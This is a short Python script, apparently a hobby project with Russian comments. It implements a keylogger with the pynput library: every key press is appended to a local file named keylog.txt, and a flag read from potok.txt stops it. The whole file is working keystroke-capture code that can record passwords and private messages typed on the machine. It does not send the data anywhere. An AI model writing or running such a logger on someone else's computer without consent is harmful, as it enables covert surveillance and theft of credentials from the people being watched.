from pynput.keyboard import Key, Listener
from threading import Thread
import logging
import time

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    key = str(key)
    f = open("keylog.txt", 'a+')
    key = key[1:len(key)-1]
    f.write(str(key).lower())
    f.close()


def on_release(key):
    stop = read_stop()
    if stop == True:
        # Stop listener
        return False


def logger():
    try:
        f = open("keylog.txt", 'r')
        f.close()
    except FileNotFoundError:
        f = open("keylog.txt", 'w')
        f.close()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # здесь же обработка
def read_stop():
    f = open('potok.txt', 'r')
    stop = f.readline().strip()
    f.close()
    if stop == '0':
        return False
    elif stop == '1':
        return True

# thread1 = Thread(target=logger)
# thread1.start()
# # Условие заверщения
# thread1.join()
